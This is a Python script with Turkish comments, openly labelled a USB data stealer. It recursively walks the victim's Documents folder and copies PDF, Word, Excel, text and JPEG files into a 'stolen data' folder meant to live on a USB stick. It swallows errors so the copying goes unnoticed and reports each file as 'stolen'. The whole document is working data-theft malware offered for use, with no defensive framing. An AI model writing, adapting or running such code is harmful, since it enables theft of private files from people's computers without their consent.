import os
import shutil
import time

# --- GÜVENLİK PİMİ YOK ---
# DİKKAT: Bu kod çalıştığı an hedef klasördeki dosyaları kopyalar (çalar).

def veri_hirsizi():
    print("--- USB STEALER AKTİF (VERİ SIZDIRMA) ---")
    
    # 1. HEDEF: Kurbanın Bilgisayarı (Belgelerim Klasörü)
    # os.path.expanduser("~") -> C:\Users\KullaniciAdi yolunu otomatik bulur
    kurban_yolu = os.path.join(os.path.expanduser("~"), "Documents")
    
    # 2. DEPO: Çalınanların Gideceği Yer
    # Kodun çalıştığı yerin yanına "CALINAN_VERILER" diye klasör açar
    # (Gerçekte burası USB belleğin kendisi olur)
    hacker_deposu = "CALINAN_VERILER"
    
    # Depo yoksa sessizce oluştur
    if not os.path.exists(hacker_deposu):
        os.makedirs(hacker_deposu)
        
    print(f"[*] Hedef Taranıyor: {kurban_yolu}")
    print(f"[*] Depo Hazırlandı: {os.path.abspath(hacker_deposu)}\n")
    
    toplam_dosya = 0
    
    # 3. ÖRÜMCEK AĞI (Spidering)
    # Tüm alt klasörleri gez
    for root, dirs, files in os.walk(kurban_yolu):
        for file in files:
            # Sadece değerli dosya uzantılarını hedef al (Çöp toplama)
            if file.endswith((".pdf", ".docx", ".xlsx", ".txt", ".jpg")):
                
                kaynak_dosya = os.path.join(root, file)
                hedef_dosya = os.path.join(hacker_deposu, file)
                
                try:
                    # 4. SIZDIRMA İŞLEMİ (Exfiltration)
                    # copy2 -> Dosya tarihini ve özelliklerini bozmadan kopyalar
                    shutil.copy2(kaynak_dosya, hedef_dosya)
                    
                    print(f"[+] ÇALINDI: {file}")
                    toplam_dosya += 1
                    
                except Exception:
                    # Hata verirse (dosya açıksa vs.) çaktırma, devam et
                    pass

    print(f"\n--- OPERASYON TAMAMLANDI ---")
    print(f"Toplam {toplam_dosya} adet dosya başarıyla sızdırıldı.")
    print("USB çıkartılabilir.")

if __name__ == "__main__":
    veri_hirsizi()